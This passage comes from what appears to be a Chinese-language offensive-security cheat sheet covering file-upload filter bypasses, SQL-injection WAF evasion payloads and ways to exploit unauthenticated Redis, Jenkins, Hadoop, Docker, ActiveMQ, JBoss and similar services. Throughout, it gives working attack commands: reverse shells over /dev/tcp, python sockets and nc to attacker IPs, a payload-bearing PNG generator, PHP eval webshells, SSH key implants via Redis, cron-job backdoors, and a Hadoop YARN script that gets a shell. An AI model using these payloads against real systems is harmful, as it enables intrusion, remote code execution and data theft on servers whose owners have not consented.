href=\"#后缀大小写\">#</a> 后缀大小写</h2>\n<h2 id=\"文件名前缀加0x09\"><a class=\"anchor\" href=\"#文件名前缀加0x09\">#</a> 文件名前缀加 [0x09]</h2>\n<h2 id=\"上传htaccess\"><a class=\"anchor\" href=\"#上传htaccess\">#</a> 上传.htaccess</h2>\n<pre><code>SetHandler application/x-httpd-php\n</code></pre>\n<h2 id=\"二次渲染\"><a class=\"anchor\" href=\"#二次渲染\">#</a> 二次渲染</h2>\n<pre><code>GIF\n找好一个大一点的GIF，尾部使用c32插入shell，上传，下载回来，使用burp的comparer功能找出整个文件没有被渲染的位置，插入shell再上传\nJPG\n使用脚本直接生成\nhttps://github.com/BlackFan/jpg_payload\nPNG\n使用脚本直接生成\n先取消php.ini注释;extension=php_gd2.dll\n&lt;?php\n$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,\n       0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,\n       0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,\n       0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,\n       0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,\n       0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,\n       0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,\n       0x66, 0x44, 0x50, 0x33);\n$img = imagecreatetruecolor(32, 32);\nfor ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;\n\t$r = $p[$y];\n\t$g = $p[$y+1];\n\t$b = $p[$y+2];\n\t$color = imagecolorallocate($img, $r, $g, $b);\n\timagesetpixel($img, round($y / 3), 0, $color);\n&#125;\nimagepng($img,'./1.png');\n?&gt;\n</code></pre>\n<h2 id=\"上传php3php4phtml等\"><a class=\"anchor\" href=\"#上传php3php4phtml等\">#</a> 上传 php3,php4,phtml 等</h2>\n<h2 id=\"文件名后加data\"><a class=\"anchor\" href=\"#文件名后加data\">#</a> 文件名后加::$DATA</h2>\n<pre><code>ConTent-Disposition: form-data; name=&quot;filepath&quot;; filename=&quot;1.asp::$DATA&quot;\nConTent-Disposition: form-data; name=&quot;filepath&quot;; filename=&quot;1.asp::$DATA\\0x00\\1.asp0x00.jpg&quot;\n</code></pre>\n<h2 id=\"asp-空格\"><a class=\"anchor\" href=\"#asp-空格\">#</a> asp . (空格 +.)</h2>\n<h2 id=\"php-点空格点\"><a class=\"anchor\" href=\"#php-点空格点\">#</a> php. .(点 + 空格 + 点)</h2>\n<h2 id=\"双写phphpp\"><a class=\"anchor\" href=\"#双写phphpp\">#</a> 双写 phphpp</h2>\n<h2 id=\"00截断\"><a class=\"anchor\" href=\"#00截断\">#</a> 00 截断</h2>\n<pre><code>Get参数00截断直接添加%00\nPOST参数00截断修改hex为00\n</code></pre>\n<h2 id=\"修改一些固定的参数\"><a class=\"anchor\" href=\"#修改一些固定的参数\">#</a> 修改一些固定的参数</h2>\n<h2 id=\"文件名去掉双引号\"><a class=\"anchor\" href=\"#文件名去掉双引号\">#</a> 文件名去掉双引号</h2>\n<h2 id=\"加一个filename1的参数\"><a class=\"anchor\" href=\"#加一个filename1的参数\">#</a> 加一个 filename1 的参数</h2>\n<h2 id=\"form变量改成form\"><a class=\"anchor\" href=\"#form变量改成form\">#</a> form 变量改成 f+orm</h2>\n<h2 id=\"去掉form-data\"><a class=\"anchor\" href=\"#去掉form-data\">#</a> 去掉 form-data</h2>\n<h2 id=\"在content-disposition或form-data后添加多个空格\"><a class=\"anchor\" href=\"#在content-disposition或form-data后添加多个空格\">#</a> 在 Content-Disposition 或 form-data; 后添加多个空格</h2>\n<h2 id=\"引号回车\"><a class=\"anchor\" href=\"#引号回车\">#</a> 引号回车</h2>\n<pre><code>ConTent-Disposition: form-data; name=&quot;filepath&quot;; filename=&quot;backlion.asp\n&quot;\n</code></pre>\n<h2 id=\"content-type和content-disposition调换位置\"><a class=\"anchor\" href=\"#content-type和content-disposition调换位置\">#</a> Content-Type 和 ConTent-Disposition 调换位置</h2>\n<h2 id=\"文件名前缀加空格\"><a class=\"anchor\" href=\"#文件名前缀加空格\">#</a> 文件名前缀加空格</h2>\n<pre><code>filename=    &quot;1.asp&quot;\n</code></pre>\n<h2 id=\"-94\"><a class=\"anchor\" href=\"#-94\">#</a> </h2>\n<h2 id=\"-95\"><a class=\"anchor\" href=\"#-95\">#</a> </h2>\n<h2 id=\"name前加空格\"><a class=\"anchor\" href=\"#name前加空格\">#</a> name 前加空格</h2>\n<pre><code>Content-Disposition: form-data;      name=&quot;uploaded&quot;; filename=&quot;1.asp&quot;\n</code></pre>\n<h2 id=\"-96\"><a class=\"anchor\" href=\"#-96\">#</a> </h2>\n<h2 id=\"-97\"><a class=\"anchor\" href=\"#-97\">#</a> </h2>\n<h2 id=\"form-data的前后加上\"><a class=\"anchor\" href=\"#form-data的前后加上\">#</a> form-data 的前后加上 +</h2>\n<pre><code>Content-Disposition: +form-data; name=&quot;filepath&quot;; filename=&quot;1.asp&quot;\n</code></pre>\n<h2 id=\"-98\"><a class=\"anchor\" href=\"#-98\">#</a> </h2>\n<h3 id=\"aspiis\"><a class=\"anchor\" href=\"#aspiis\">#</a> ASP+IIS</h3>\n<pre><code>s%elect&gt;select\ns%u0065lect&gt;select  \ns%u00f0lect&gt;select\ns%u0045lect = s%u0065lect = %u00f0lect\nu --&gt;%u0055 --&gt; %u0075\nn --&gt;%u004e --&gt; %u006e\ni --&gt;%u0049 --&gt; %u0069\no --&gt;%u004f --&gt; %u006f --&gt;%u00ba\ns --&gt;%u0053 --&gt; %u0073\nl --&gt;%u004c --&gt; %u006c\ne --&gt;%u0045 --&gt; %u0065--&gt;%u00f0\nc --&gt;%u0043 --&gt; %u0063\nt --&gt;%u0054 --&gt;%u0074 --&gt;%u00de --&gt;%u00fe\nf --&gt;%u0046 --&gt;%u0066\nr --&gt;%u0052 --&gt;%u0072\nm --&gt;%u004d --&gt;%u006d\n</code></pre>\n<h2 id=\"-99\"><a class=\"anchor\" href=\"#-99\">#</a> </h2>\n<h3 id=\"aspiisaspxiis\"><a class=\"anchor\" href=\"#aspiisaspxiis\">#</a> Asp+iis&amp;aspx+iis</h3>\n<pre><code>s%u006c%u0006ect&gt;select\n</code></pre>\n<h2 id=\"-100\"><a class=\"anchor\" href=\"#-100\">#</a> </h2>\n<h3 id=\"apache\"><a class=\"anchor\" href=\"#apache\">#</a> apache</h3>\n<pre><code>TEST /sql.php?id=1 HTTP/1.1\n</code></pre>\n<h2 id=\"-101\"><a class=\"anchor\" href=\"#-101\">#</a> </h2>\n<h3 id=\"大小写关键字\"><a class=\"anchor\" href=\"#大小写关键字\">#</a> 大小写 / 关键字</h3>\n<pre><code>UniOn SeLECT\nMid()substring()  substr()\nHex()ascii()\nsleep() =benchmark()\nconcat_ws()=group_concat()\n</code></pre>\n<h2 id=\"-102\"><a class=\"anchor\" href=\"#-102\">#</a> </h2>\n<h3 id=\"双重url编码\"><a class=\"anchor\" href=\"#双重url编码\">#</a> 双重 url 编码</h3>\n<h2 id=\"-103\"><a class=\"anchor\" href=\"#-103\">#</a> </h2>\n<h3 id=\"变换请求方式\"><a class=\"anchor\" href=\"#变换请求方式\">#</a> 变换请求方式</h3>\n<h2 id=\"-104\"><a class=\"anchor\" href=\"#-104\">#</a> </h2>\n<h3 id=\"hpp参数污染\"><a class=\"anchor\" href=\"#hpp参数污染\">#</a> HPP 参数污染</h3>\n<pre><code>id=1&amp;id=2&amp;id=3\n得到的结果：Asp.net + iis：id=1,2,3 \nAsp+iis：id=1,2,3 \nPhp+apache：id=3\nMSSQL:\nGET+POST: \nGET:http://192.168.125.140/test/sql.aspx?id=1 union/*\npost:  id=2*/select null,null,null\n无逗号形式：\n?id=1 union select 1&amp;id=2&amp;id=3&amp;id=4 from admin--（）  \n利用逗号：\n?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--\n无效参数形式：\n?a=/*&amp;sql=xxx&amp;b=*/  a,b为无效参数\n溢出形式：?id=1/*&amp;id=*//*&amp;id=*//*......&amp;id=*//*&amp;id=*/ union  select null,system_user,null from INFORMATION_SCHEMA.schemata\nMYSQL：\n?id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=….. &amp;id=1 union select 1,2 from admin\n</code></pre>\n<h2 id=\"-105\"><a class=\"anchor\" href=\"#-105\">#</a> </h2>\n<h3 id=\"数据库-2\"><a class=\"anchor\" href=\"#数据库-2\">#</a> 数据库</h3>\n<h2 id=\"-106\"><a class=\"anchor\" href=\"#-106\">#</a> </h2>\n<h2 id=\"-107\"><a class=\"anchor\" href=\"#-107\">#</a> </h2>\n<h2 id=\"access\"><a class=\"anchor\" href=\"#access\">#</a> Access</h2>\n<pre><code>空格符\n%09、%0a、%0c、%0d、%16\n</code></pre>\n<h2 id=\"-108\"><a class=\"anchor\" href=\"#-108\">#</a> </h2>\n<h2 id=\"-109\"><a class=\"anchor\" href=\"#-109\">#</a> </h2>\n<h2 id=\"mysql-2\"><a class=\"anchor\" href=\"#mysql-2\">#</a> Mysql</h2>\n<pre><code>注释符\n#、/*...*/、--[空格] ...\n空格符\n[0x09,0x0a-0x0d,0x20,0xa0]\n特殊符号\n%a 换行符，可结合注释符使用%23%0a，%2d%2d%0a。\n%21  ！ 叹号\n%2b  +  加号\n%2d  -  减号\n%40  @  符号\n%7e   ~  波浪号\nId=1 union select(1),user()\nId=1 union /!12345select/1,user()\nId=1 union select@1,user()\nId=1 union select &#123;x 1&#125;,user()\nId=1 union select&quot;1&quot;,user()\nId=1 union select\\N,user()\nId=1 union select 1,user()`\nId=1 union select 1,user()&quot;&quot;\nId=1 union select 1,user()A\nId=1 union select 1,user()`b\nId=1 union(select 1,(select/!schema_name/from information_schema.SCHEMATA limit 1,1))\nId=1 union(select 1,(select&#123;x schema_name&#125;from information_schema.SCHEMATA limit 1,1))\nId=1 union(select 1,(select(schema_name)from information_schema.SCHEMATA limit 1,1))\n浮点数\nId= 1.0union select 1,user()\nId= 1.union select 1,user()\nId= 1E0union select 1,user()\nId=\\Nunion select 1,user()\nId=1 unionselect user(),2.0from admin\nId=1 union select user(),8e0from admin\nId=1 union select user(),\\Nfrom admin\n内联注释\n/*!UnIon12345SelEcT*/ 1,user()   //数字范围 1000-50540\nmysql黑魔法\nselect&#123;x username&#125;from &#123;x11 test.admin&#125;;\n函数\n截取\nMid(version(),1,1)\nSubstr(version(),1,1)\nSubstring(version(),1,1)\nLpad(version(),1,1)\nRpad(version(),1,1)\nLeft(version(),1)\nreverse(right(reverse(version()),1)) \n连接\nconcat(version(),'|',user());\nconcat_ws('|',1,2,3)\n字符转换\nAscii() Char() Hex() Unhex()\n过滤逗号\n127' UNION SELECT * FROM ((SELECT1)a JOIN (SELECT2)b JOIN (SELECT3)c JOIN (SELECT4)d JOIN (SELECT5)e)# \n相当于 union select 1,2,3,4,5\nunion select * from (select 1)a join(select&#123;x schema_name&#125; from information_schema.SCHEMATA limit 1,1)b\nlimit 1 offset 0相当于limit 1,0\nmid(version() from 1 for 1)相当于Mid(version(),1,1)\n&lt;&gt;被过滤\nid=1 and ascii(substr(database(),0,1))&gt;64\n比较符\ngreatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值\nid=1 and greatest(ascii(substr(database(),0,1)),64)=64\n函数构造\nsleep(5)/benchmark(10000000,SHA1(1))\nid=1 xor sleep%23%0a(5)\nid=1 xor sleep%2d%2d%0a(5)\nid=1 xor sleep([%20]5) \nid=1 xor benchmark%0a(10000000,SHA1(1))\nid=1 xor sleep[空白字符](5)\nselect&#123;x[可填充字符]1&#125;\n</code></pre>\n<h2 id=\"-110\"><a class=\"anchor\" href=\"#-110\">#</a> </h2>\n<h2 id=\"-111\"><a class=\"anchor\" href=\"#-111\">#</a> </h2>\n<h2 id=\"mssql-2\"><a class=\"anchor\" href=\"#mssql-2\">#</a> MSSQL</h2>\n<pre><code>注释符\n/*、--、;00%、/**/\n空格符\n[0x01-0x20][0x0a-0x0f][0x1a-0x-1f]\n特殊符号\n%3a 冒号\nid=1 union:select 1,2 from:admin\nid=1 union select+1,'2',db_name() from admin\nid=1 union select-1,'2',db_name() from admin\nid=1 union select.1,'2',db_name() from admin\nid=1 union select:1,'2',db_name() from admin\nid=1 union select~1,'2',db_name() from admin\nid=1%20union%20select%201,'2',db_name()%80from%20admin\nid=1 union select 1,'2',db_name+() from admin\n函数变形: db_name[空白字符]()\n浮点数\nid=1.1union select 1,'2',db_name()\nid=1e0union select 1,'2',db_name()\n运算符\nid=1-1union select '1',system_user,3 from admin\nid=1e-union select '1',system_user,3 from admin\n字符串截取函数\nSubstring(@@version,1,1)\nLeft(@@version,1)\nRight(@@version,1)\ncharindex('test',db_name())\n字符串转换函数\nAscii('a')=char(97) 括号之间可添加空格\n</code></pre>\n<h2 id=\"-112\"><a class=\"anchor\" href=\"#-112\">#</a> </h2>\n<h3 id=\"waf\"><a class=\"anchor\" href=\"#waf\">#</a> WAF</h3>\n<pre><code>同时提交GET和POST\n访问HTTP绕过对HTTPS的防护\n%00截断\n参数填充垃圾数据，缓冲区溢出\nX-FORWARDED-FOR伪造绕过\n静态文件/sql.php/1.js?id=1绕过\n白名单绕过，URL只要存在某字符就不会拦截\n/sql.php/admin.php?id=1\n/sql.php?a=/manage/&amp;b=../etc/passwd\n/../../../manage/../sql.asp?id=2\n伪造User-agent绕过，可改为爬虫agent\n</code></pre>\n<h2 id=\"-113\"><a class=\"anchor\" href=\"#-113\">#</a> </h2>\n<h2 id=\"未授权访问\"><a class=\"anchor\" href=\"#未授权访问\">#</a> 未授权访问</h2>\n<h2 id=\"-114\"><a class=\"anchor\" href=\"#-114\">#</a> </h2>\n<h3 id=\"redis未授权访问\"><a class=\"anchor\" href=\"#redis未授权访问\">#</a> Redis 未授权访问</h3>\n<h2 id=\"-115\"><a class=\"anchor\" href=\"#-115\">#</a> </h2>\n<h2 id=\"-116\"><a class=\"anchor\" href=\"#-116\">#</a> </h2>\n<h2 id=\"测试\"><a class=\"anchor\" href=\"#测试\">#</a> 测试</h2>\n<pre><code>&gt;redis-cli -h 127.0.0.1 flunshall \n192.168.0.110:6379&gt;ping\nPONG 存在未授权访问\n</code></pre>\n<h2 id=\"-117\"><a class=\"anchor\" href=\"#-117\">#</a> </h2>\n<h2 id=\"-118\"><a class=\"anchor\" href=\"#-118\">#</a> </h2>\n<h2 id=\"js打内网\"><a class=\"anchor\" href=\"#js打内网\">#</a> JS 打内网</h2>\n<pre><code>var cmd = new XMLHttpRequest();      \ncmd.open(&quot;POST&quot;, &quot;http://127.0.0.1:6379&quot;);      \ncmd.send('flushall\\r\\n');             \nvar cmd =new XMLHttpRequest();      \ncmd.open(&quot;POST&quot;, &quot;http://127.0.0.1:6379&quot;);      \ncmd.send('eval \\'' + 'redis.call(\\&quot;set\\&quot;,\\&quot;1\\&quot;,\\&quot;\\\\n\\\\n*/1 * * * * /bin/bash -i &gt;&amp;/dev/tcp/外网IP/5566 0&gt;&amp;1\\\\n\\\\n&quot;);redis.call(\\&quot;config\\&quot;, \\&quot;set\\&quot;, \\&quot;dir\\&quot;,\\&quot;/var/spool/cron/\\&quot;); redis.call(\\&quot;config\\&quot;,\\&quot;set\\&quot;, \\&quot;dbfilename\\&quot;, \\&quot;root\\&quot;);' + '\\' 0' +&quot;\\r\\n&quot;);       \nvar cmd =new XMLHttpRequest();      \ncmd.open(&quot;POST&quot;, &quot;http://127.0.0.1:6379&quot;);       \ncmd.send('save\\r\\n');\n</code></pre>\n<h2 id=\"-119\"><a class=\"anchor\" href=\"#-119\">#</a> </h2>\n<h2 id=\"-120\"><a class=\"anchor\" href=\"#-120\">#</a> </h2>\n<h2 id=\"反弹shell\"><a class=\"anchor\" href=\"#反弹shell\">#</a> 反弹 shell</h2>\n<pre><code>保存为sh\necho -e &quot;\\n\\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.108/12138 0&gt;&amp;1\\n\\n&quot;|redis-cli -h $1 -p $2 -x set 1\necho -e &quot;\\n\\n */1 * * * * python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.108&quot;,12138));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'\\n\\n&quot;|redis-cli -h $1 -p $2 -x set 1\nredis-cli -h $1 -p $2 config set dir /var/spool/cron/\nredis-cli -h $1 -p $2 config set dbfilename root\nredis-cli -h $1 -p $2 save\nredis-cli -h $1 -p $2 quit\n执行\n&gt;bash 1.sh 192.168.0.120 6379\n</code></pre>\n<p><img data-src=\"34.png\" alt=\"\" /><br />\n<img data-src=\"35.png\" alt=\"\" /></p>\n<h2 id=\"-121\"><a class=\"anchor\" href=\"#-121\">#</a> </h2>\n<h2 id=\"-122\"><a class=\"anchor\" href=\"#-122\">#</a> </h2>\n<h2 id=\"写shell\"><a class=\"anchor\" href=\"#写shell\">#</a> 写 shell</h2>\n<pre><code>6379&gt; config set dir /var/www/html/\n6379&gt; config set dbfilename shell.php\n6379&gt; set x &quot;&lt;?php phpinfo();?&gt;&quot;\n6379&gt; save\n</code></pre>\n<h2 id=\"-123\"><a class=\"anchor\" href=\"#-123\">#</a> </h2>\n<h2 id=\"-124\"><a class=\"anchor\" href=\"#-124\">#</a> </h2>\n<h2 id=\"ssh\"><a class=\"anchor\" href=\"#ssh\">#</a> SSH</h2>\n<pre><code>ssh-keygen\n本地生成一对密钥\nhttps://github.com/JoyChou93/hackredis\n&gt;ssh-keygen -t rsa -C &quot;xx@xx.com&quot;\n&gt;(echo -e &quot;\\n\\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; qq.txt\n&gt;redis-cli -h 127.0.0.1 flunshall\n&gt;cat qq.txt | redis-cli -h 127.0.0.1 -x set crackit\n&gt;redis-cli -h 127.0.0.1\n6379&gt; config set dir /root/.ssh/\n6379&gt; config set dbfilename &quot;authorized_keys&quot;\n6379&gt; save\n本地登录\n#ssh -i id_rsa root@11.11.11.11\n</code></pre>\n<h2 id=\"-125\"><a class=\"anchor\" href=\"#-125\">#</a> </h2>\n<h2 id=\"-126\"><a class=\"anchor\" href=\"#-126\">#</a> </h2>\n<h2 id=\"redis-rogue-getshell\"><a class=\"anchor\" href=\"#redis-rogue-getshell\">#</a> redis-rogue-getshell</h2>\n<pre><code>https://github.com/vulhub/redis-rogue-getshell\n需要python3.0以上\n编译\n&gt;cd RedisModulesSDK/\n&gt;make\n会在此目录下生成exp.so\n执行命令\n&gt;python3 redis-master.py -r 192.168.0.120 -p 6379 -L 192.168.0.108 -P 12138 -f RedisModulesSDK/exp.so -c &quot;cat /etc/passwd&quot;\n</code></pre>\n<p><img data-src=\"36.png\" alt=\"\" /></p>\n<h2 id=\"-127\"><a class=\"anchor\" href=\"#-127\">#</a> </h2>\n<h2 id=\"-128\"><a class=\"anchor\" href=\"#-128\">#</a> </h2>\n<h2 id=\"redis-rogue-server\"><a class=\"anchor\" href=\"#redis-rogue-server\">#</a> redis-rogue-server</h2>\n<pre><code>https://github.com/n0b0dyCN/redis-rogue-server\n需要python3.6以上\n编译\n&gt;cd RedisModulesSDK/exp\n&gt;make\n执行\n&gt;./redis-rogue-server.py --rhost 192.168.0.120 --lhost 192.168.0.108\n</code></pre>\n<p><img data-src=\"37.png\" alt=\"\" /><br />\n<img data-src=\"38.png\" alt=\"\" /></p>\n<pre><code>也可以反向shell\n</code></pre>\n<p><img data-src=\"39.png\" alt=\"\" /><br />\n<img data-src=\"40.png\" alt=\"\" /></p>\n<h2 id=\"-129\"><a class=\"anchor\" href=\"#-129\">#</a> </h2>\n<h2 id=\"-130\"><a class=\"anchor\" href=\"#-130\">#</a> </h2>\n<h2 id=\"redis在windows下的利用\"><a class=\"anchor\" href=\"#redis在windows下的利用\">#</a> redis 在 windows 下的利用</h2>\n<pre><code>Web目录写入木马\n启动项\n系统DLL劫持(目标重启或注销)\n特定软件的DLL劫持\n覆盖快捷方式\n覆盖配置文件\n覆盖sethc等文件\nhttps://github.com/r35tart/RedisWriteFile\n&gt;python3 rediswritefile.py --rhost=目标IP --rport=6379 --lhost=本机IP --lport=本地端口 --rpath=&quot;在目标保存的路径&quot; --rfile=&quot;在目标保存的文件&quot; --lfile=&quot;本地文件&quot; --auth=redis密码\n</code></pre>\n<h2 id=\"-131\"><a class=\"anchor\" href=\"#-131\">#</a> </h2>\n<h2 id=\"-132\"><a class=\"anchor\" href=\"#-132\">#</a> </h2>\n<h2 id=\"lua-rce\"><a class=\"anchor\" href=\"#lua-rce\">#</a> Lua RCE</h2>\n<pre><code>https://github.com/QAX-A-Team/redis_lua_exploit\n修改redis_lua.py里的 host 为目标 IP\n执行返回正常，反弹shell\n&gt;eval &quot;tonumber('/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.108/12345 0&gt;&amp;1', 8)&quot; 0\n</code></pre>\n<h2 id=\"-133\"><a class=\"anchor\" href=\"#-133\">#</a> </h2>\n<h3 id=\"jenkins未授权访问\"><a class=\"anchor\" href=\"#jenkins未授权访问\">#</a> Jenkins 未授权访问</h3>\n<pre><code>http://www.qq.com:8080/manage\nhttp://www.qq.com:8080/script\n执行命令\n&gt;println &quot;ifconfig -a&quot;.execute().text\n反弹shell\n&gt;println &quot;wget http://your.com/back.py -P /tmp/&quot;.execute().text\n&gt;println &quot;python /tmp/back.py yourIP 8080&quot;.execute().text\n写shell\n&gt;println &quot;wget http://your.com/t.txt -o /var/www/html/1.php&quot;.execute().text\n&gt;new File(&quot;/var/www/html/1.php&quot;).write('&lt;?php @eval($_POST[1]);?&gt;');\n&gt;def webshell = '&lt;?php @eval($_POST[1]);?&gt;'\n&gt;new File(&quot;/var/www/html/1.php&quot;).write(&quot;$webshell&quot;);\n</code></pre>\n<h2 id=\"-134\"><a class=\"anchor\" href=\"#-134\">#</a> </h2>\n<h3 id=\"mongodb未授权访问\"><a class=\"anchor\" href=\"#mongodb未授权访问\">#</a> MongoDB 未授权访问</h3>\n<pre><code>默认端口27017直接连接进行增删改查\n连接工具\nhttps://s3.mongobooster.com/download/releasesv5/nosqlbooster4mongo-5.1.12.exe\n</code></pre>\n<h2 id=\"-135\"><a class=\"anchor\" href=\"#-135\">#</a> </h2>\n<h3 id=\"zookeeper未授权访问\"><a class=\"anchor\" href=\"#zookeeper未授权访问\">#</a> ZooKeeper 未授权访问</h3>\n<pre><code>默认端口2181\n获得服务器环境信息\n&gt;echo envi|nc 192.168.0.1 2181\n连接\n&gt;./zkCli.sh -server ip:port\n连接工具\nhttps://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip\n</code></pre>\n<h2 id=\"-136\"><a class=\"anchor\" href=\"#-136\">#</a> </h2>\n<h3 id=\"elasticsearch未授权访问\"><a class=\"anchor\" href=\"#elasticsearch未授权访问\">#</a> Elasticsearch 未授权访问</h3>\n<pre><code>默认端口9200\nhttp://1.1.1.1:9200/_plugin/head/\nhttp://1.1.1.1:9200/_nodes\nhttp://1.1.1.1:9200/_river\nhttp://1.1.1.1:9200/_plugin/sql/\n</code></pre>\n<h2 id=\"-137\"><a class=\"anchor\" href=\"#-137\">#</a> </h2>\n<h3 id=\"memcache未授权访问\"><a class=\"anchor\" href=\"#memcache未授权访问\">#</a> Memcache 未授权访问</h3>\n<pre><code>默认端口11211\n&gt;telnet 1.1.1.1 11211\n&gt;nc -vv 1.1.1.1 11211\n</code></pre>\n<h2 id=\"-138\"><a class=\"anchor\" href=\"#-138\">#</a> </h2>\n<h3 id=\"hadoop未授权访问\"><a class=\"anchor\" href=\"#hadoop未授权访问\">#</a> Hadoop 未授权访问</h3>\n<pre><code>http://192.168.1.1:8088/cluster\n本地监听端口 &gt;&gt; 创建Application &gt;&gt; 调用Submit Application API提交\n</code></pre>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token string\">'http://192.168.18.129:8088/'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>lhost <span class=\"token operator\">=</span> <span class=\"token string\">'192.168.18.138'</span> <span class=\"token comment\"># put your local host ip here, and listen at port 9999</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>url <span class=\"token operator\">=</span> target <span class=\"token operator\">+</span> <span class=\"token string\">'ws/v1/cluster/apps/new-application'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>resp <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>app_id <span class=\"token operator\">=</span> resp<span class=\"token punctuation\">.</span>json<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'application-id'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>url <span class=\"token operator\">=</span> target <span class=\"token operator\">+</span> <span class=\"token string\">'ws/v1/cluster/apps'</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token string\">'application-id'</span><span class=\"token punctuation\">:</span> app_id<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token string\">'application-name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'get-shell'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token string\">'am-container-spec'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token string\">'commands'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token string\">'command'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'/bin/bash -i >&amp; /dev/tcp/%s/9999 0>&amp;1'</span> <span class=\"token operator\">%</span> lhost<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token string\">'application-type'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'YARN'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> json<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"-139\"><a class=\"anchor\" href=\"#-139\">#</a> </h2>\n<h3 id=\"docker未授权访问\"><a class=\"anchor\" href=\"#docker未授权访问\">#</a> Docker 未授权访问</h3>\n<pre><code>默认端口2375\n&gt;docker -H tcp://1.1.1.1:2375 images\n本地监听\n启动容器\ndocker -H tcp://1.1.1.1:2375 run -id -v /etc/crontabs:/tmp alpine:latest\ndocker -H tcp://1.1.1.1:2375 ps\n进入容器\ndocker -H tcp://1.1.1.1:2375 exec -it a8ff7ed880fb sh\necho '* * * * * /usr/bin/nc &#123;vps_ip&#125; 9999 -e /bin/sh' &gt;&gt; /tmp/root #添加计划任务\ncat /tmp/root \nexit\nShipyard默认密码\nadmin/shipyard\n</code></pre>\n<h2 id=\"-140\"><a class=\"anchor\" href=\"#-140\">#</a> </h2>\n<h3 id=\"activemq未授权访问\"><a class=\"anchor\" href=\"#activemq未授权访问\">#</a> ActiveMQ 未授权访问</h3>\n<pre><code>默认端口8161\nhttp://1.1.1.1:8161/admin/connections.jsp\nPUT /fileserver/%2F%2F2%083.jsp HTTP/1.0\nContent-Length: 27\nHost: 1.1.1.1:8161\nConnection: Close\nAuthorization: Basic YWRtaW46YWRtaW4=\n123123123123123123123123123\n</code></pre>\n<h2 id=\"-141\"><a class=\"anchor\" href=\"#-141\">#</a> </h2>\n<h3 id=\"jboss未授权访问\"><a class=\"anchor\" href=\"#jboss未授权访问\">#</a> JBOSS 未授权访问</h3>\n<pre><code>http://192.168.1.1:8080/jmx-console/ 无需认证进入\njboss.deployment部署shell\naddURL()的paramValue写入远程war木马地址\n</code></pre>\n<h2 id=\"-142\"><a class=\"anchor\" href=\"#-142\">#</a> </h2>\n<h2 id=\"阿里云oss-key利用\"><a class=\"anchor\" href=\"#阿里云oss-key利用\">#</a> 阿里云 OSS Key 利用</h2>\n<pre><code>反编译app文件，查找可能会包含oss key的文件，如JS。\nOSSAccessKey、AccessKeySecret使用OSS浏览器访问。\n第三方行云管家可修改系统密码。\n反弹shell\nFrom: 